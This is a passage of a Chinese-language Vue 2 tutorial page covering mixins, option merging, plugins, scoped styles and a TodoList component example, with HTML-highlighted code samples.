class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs html">// 定义一个混入对象<br>var myMixin = &#123;<br>  created: function () &#123;<br>    this.hello()<br>  &#125;,<br>  methods: &#123;<br>    hello: function () &#123;<br>      console.log(&#x27;hello from mixin!&#x27;)<br>    &#125;<br>  &#125;<br>&#125;<br><br>// 定义一个使用混入对象的组件<br>var Component = Vue.extend(&#123;<br>  mixins: [myMixin]<br>&#125;)<br><br></code></pre></td></tr></table></figure><h3 id="选项合并"><a href="#选项合并" class="headerlink" title="选项合并"></a><strong>选项合并</strong></h3><p>当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。</p><p>比如，数据对象在内部会进行递归合并，并在发生冲突时以组件数据优先。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vue">var mixin = &#123;<br>  data: function () &#123;<br>    return &#123;<br>      message: &#x27;hello&#x27;,<br>      foo: &#x27;abc&#x27;<br>    &#125;<br>  &#125;<br>&#125;<br><br>new Vue(&#123;<br>  mixins: [mixin],<br>  data: function () &#123;<br>    return &#123;<br>      message: &#x27;goodbye&#x27;,<br>      bar: &#x27;def&#x27;<br>    &#125;<br>  &#125;,<br>  created: function () &#123;<br>    console.log(this.$data)<br>    // =&gt; &#123; message: &quot;goodbye&quot;, foo: &quot;abc&quot;, bar: &quot;def&quot; &#125;<br>  &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子 <strong>之前</strong> 调用。</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html">var mixin = &#123;<br>  created: function () &#123;<br>    console.log(&#x27;混入对象的钩子被调用&#x27;)<br>  &#125;<br>&#125;<br><br>new Vue(&#123;<br>  mixins: [mixin],<br>  created: function () &#123;<br>    console.log(&#x27;组件钩子被调用&#x27;)<br>  &#125;<br>&#125;)<br><br>// =&gt; &quot;混入对象的钩子被调用&quot;<br>// =&gt; &quot;组件钩子被调用&quot;<br><br></code></pre></td></tr></table></figure><p>值为对象的选项，例如 <code>methods</code>、<code>components</code> 和<code>directives</code>，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html">var mixin = &#123;<br>  methods: &#123;<br>    foo: function () &#123;<br>      console.log(&#x27;foo&#x27;)<br>    &#125;,<br>    conflicting: function () &#123;<br>      console.log(&#x27;from mixin&#x27;)<br>    &#125;<br>  &#125;<br>&#125;<br><br>var vm = new Vue(&#123;<br>  mixins: [mixin],<br>  methods: &#123;<br>    bar: function () &#123;<br>      console.log(&#x27;bar&#x27;)<br>    &#125;,<br>    conflicting: function () &#123;<br>      console.log(&#x27;from self&#x27;)<br>    &#125;<br>  &#125;<br>&#125;)<br><br>vm.foo() // =&gt; &quot;foo&quot;<br>vm.bar() // =&gt; &quot;bar&quot;<br>vm.conflicting() // =&gt; &quot;from self&quot;<br><br></code></pre></td></tr></table></figure><blockquote><p>全局混入不建议使用</p></blockquote><h3 id="plugin-插件"><a href="#plugin-插件" class="headerlink" title="plugin 插件"></a>plugin 插件</h3><ol><li>功能：用于增强Vue</li><li>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据</li><li>定义插件（见下 src&#x2F;plugin.js）</li><li>使用插件：Vue.use()</li></ol>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">// 调用 `MyPlugin.install(Vue)`<br>Vue.use(MyPlugin)<br><br>new Vue(&#123;<br>  // ...组件选项<br>&#125;)<br><br></code></pre></td></tr></table></figure><p>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</p><p>定义插件：</p>   <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">对象.install = function (Vue, options) &#123;<br>    // 1. 添加全局过滤器<br>    Vue.filter(....)<br><br>    // 2. 添加全局指令<br>    Vue.directive(....)<br><br>    // 3. 配置全局混入(合)<br>    Vue.mixin(....)<br><br>    // 4. 添加实例方法<br>    Vue.prototype.$myMethod = function () &#123;...&#125;<br>    Vue.prototype.$myProperty = xxxx<br>&#125;<br><br></code></pre></td></tr></table></figure><p>具体案例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs html">export default &#123;<br>    install(Vue, x, y, z) &#123;<br>        console.log(x, y, z)<br>        //全局过滤器<br>        Vue.filter(&#x27;mySlice&#x27;, function (value) &#123;<br>            return value.slice(0, 4)<br>        &#125;)<br><br>        //定义全局指令<br>        Vue.directive(&#x27;fbind&#x27;, &#123;<br>            //指令与元素成功绑定时（一上来）<br>            bind(element, binding) &#123;<br>                element.value = binding.value<br>            &#125;,<br>            //指令所在元素被插入页面时<br>            inserted(element, binding) &#123;<br>                element.focus()<br>            &#125;,<br>            //指令所在的模板被重新解析时<br>            update(element, binding) &#123;<br>                element.value = binding.value<br>            &#125;<br>        &#125;)<br><br>        //定义混入<br>        Vue.mixin(&#123;<br>            data() &#123;<br>                return &#123;<br>                    x: 100,<br>                    y: 200<br>                &#125;<br>            &#125;,<br>        &#125;)<br><br>        //给Vue原型上添加一个方法（vm和vc就都能用了）<br>        Vue.prototype.hello = () =&gt; &#123; alert(&#x27;你好啊aaaa&#x27;) &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>main.js</p>  <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html">// 引入插件<br>import plugin from &#x27;./plugin&#x27;<br><br>// 使用插件<br>Vue.use(plugin)<br><br></code></pre></td></tr></table></figure><p>然后就可以在别的组件使用插件里的功能了。</p><h3 id="scoped样式"><a href="#scoped样式" class="headerlink" title="scoped样式"></a>scoped样式</h3><pre><code class="hljs">1. 作用：让样式在局部生效，防止冲突。2. 写法：`&lt;style scoped&gt;`</code></pre><blockquote><p>Vue中的webpack并没有安装最新版，导致有些插件也不能默认安装最新版，如 npm i less-loader@7，而不是最新版</p></blockquote><p>具体案例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;less&quot;</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css"><span class="hljs-selector-class">.demo</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css"><span class="hljs-selector-class">.atguigu</span>&#123;</span><br><span class="language-css"><span class="hljs-attribute">font-size</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">&#125;</span><br><span class="language-css">&#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;School.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>学校名称：&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>学校地址：&#123;&#123; address &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;School&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>:<span class="hljs-string">&#x27;尚硅谷atguigu&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">address</span>:<span class="hljs-string">&#x27;北京&#x27;</span>,</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.demo</span>&#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: skyblue;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>src&#x2F;components&#x2F;Student.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;demo&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>学生姓名：&#123;&#123; name &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;atguigu&quot;</span>&gt;</span>学生性别：&#123;&#123; sex &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;Student&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;张三&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">sex</span>: <span class="hljs-string">&#x27;男&#x27;</span></span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;less&quot;</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.demo</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">background-color</span>: pink;</span><br><span class="language-css">    <span class="hljs-selector-class">.atguigu</span> &#123;</span><br><span class="language-css">      <span class="hljs-attribute">font-size</span>: <span class="hljs-number">40px</span>;</span><br><span class="language-css">    &#125;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><p>src&#x2F;App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;title&quot;</span>&gt;</span>你好啊<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">School</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Student</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/Student&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">School</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/School&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>: &#123; <span class="hljs-title class_">School</span>, <span class="hljs-title class_">Student</span> &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-selector-class">.title</span> &#123;</span><br><span class="language-css">    <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">  &#125;</span><br><span class="language-css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br><br></code></pre></td></tr></table></figure><h3 id="总结TodoList案例"><a href="#总结TodoList案例" class="headerlink" title="总结TodoList案例"></a>总结TodoList案例</h3><h4 id="组件化编码流程："><a href="#组件化编码流程：" class="headerlink" title="组件化编码流程："></a>组件化编码流程：</h4><ol><li><p>拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。</p></li><li><p>实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：</p><ul><li><p>一个组件在用：放在组件自身即可。</p></li><li><p>一些组件在用：放在他们共同的父组件上（状态提升）。</p></li></ul></li><li><p>实现交互：从绑定事件开始。</p><ul><li>props适用于：<ul><li>父组件 &#x3D;&#x3D;&gt; 子组件 通信</li><li>子组件 &#x3D;&#x3D;&gt; 父组件 通信（要求父先给子一个函数）</li></ul></li></ul></li><li><p>使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的！</p></li><li><p>props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。</p></li></ol><p>src&#x2F;App.vue</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;root&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-container&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;todo-wrap&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyHeader</span> <span class="hljs-attr">:addTodo</span>=<span class="hljs-string">&quot;addTodo&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyList</span> <span class="hljs-attr">:todos</span>=<span class="hljs-string">&quot;todos&quot;</span> <span class="hljs-attr">:checkTodo</span>=<span class="hljs-string">&quot;checkTodo&quot;</span> <span class="hljs-attr">:deleteTodo</span>=<span class="hljs-string">&quot;deleteTodo&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">MyFooter</span> <span class="hljs-attr">:todos</span>=<span class="hljs-string">&quot;todos&quot;</span> </span><br><span class="hljs-tag">                  <span class="hljs-attr">:checkAllTodo</span>=<span class="hljs-string">&quot;checkAllTodo&quot;</span> <span class="hljs-attr">:clearAllTodo</span>=<span class="hljs-string">&quot;clearAllTodo&quot;</span>/&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyHeader</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyHeader&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyList</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyList&#x27;</span></span><br><span class="language-javascript">  <span class="hljs-keyword">import</span> <span class="hljs-title class_">MyFooter</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./components/MyFooter.vue&#x27;</span></span><br><span class="language-javascript"></span><br><span class="language-javascript">  <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="language-javascript">    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;App&#x27;</span>,</span><br><span class="language-javascript">    <span class="hljs-attr">components</span>: &#123; <span class="hljs-title class_">MyHeader</span>, <span class="hljs-title class_">MyList</span>, <span class="hljs-title class_">MyFooter</span> &#125;,</span><br><span class="language-javascript">    <span class="hljs-title function_">data</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">      <span class="hljs-keyword">return</span> &#123;</span><br><span class="language-javascript">        <span class="hljs-comment">// 由于todos是MyHeader组件和MyFooter组件都在使用，所以放在App中（状态提升）</span></span><br><span class="language-javascript">        <span class="hljs-attr">todos</span>:[</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;001&#x27;</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;抽烟&#x27;</span>,<span class="hljs-attr">done</span>:<span class="hljs-literal">true</span>&#125;,</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;002&#x27;</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;喝酒&#x27;</span>,<span class="hljs-attr">done</span>:<span class="hljs-literal">false</span>&#125;,</span><br><span class="language-javascript">          &#123;<span class="hljs-attr">id</span>:<span class="hljs-string">&#x27;003&#x27;</span>,<span class="hljs-attr">title</span>:<span class="hljs-string">&#x27;开车&#x27;</span>,<span class="hljs-attr">done</span>:<span class="hljs-literal">true</span>&#125;</span><br><span class="language-javascript">        ]</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;,</span><br><span class="language-javascript">    <span class="hljs-attr">methods</span>: &#123;</span><br><span class="language-javascript">      <span class="hljs-comment">//添加一个todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">addTodo</span>(<span class="hljs-params">todoObj</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">unshift</span>(todoObj)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//勾选or取消勾选一个todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">checkTodo</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>)=&gt;</span>&#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">if</span>(todo.<span class="hljs-property">id</span> === id) todo.<span class="hljs-property">done</span> = !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//删除一个todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">deleteTodo</span>(<span class="hljs-params">id</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>( <span class="hljs-function"><span class="hljs-params">todo</span> =&gt;</span> todo.<span class="hljs-property">id</span> !== id )</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//全选or取消全选</span></span><br><span class="language-javascript">      <span class="hljs-title function_">checkAllTodo</span>(<span class="hljs-params">done</span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>)=&gt;</span>&#123;</span><br><span class="language-javascript">          todo.<span class="hljs-property">done</span> = done</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;,</span><br><span class="language-javascript">      <span class="hljs-comment">//清除所有已经完成的todo</span></span><br><span class="language-javascript">      <span class="hljs-title function_">clearAllTodo</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">        <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">todos</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">todo</span>)=&gt;</span>&#123;</span><br><span class="language-javascript">          <span class="hljs-keyword">return</span> !todo.<span class="hljs-property">done</span></span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">    &#125;</span><br><span class="language-javascript">  &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">  <span class="hljs-comment">/*base*/</span></span><br><span class="language-css">  <span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">background</span>: <span class="hljs-number">#fff</span>;&#125;</span><br><span class="language-css">  <span 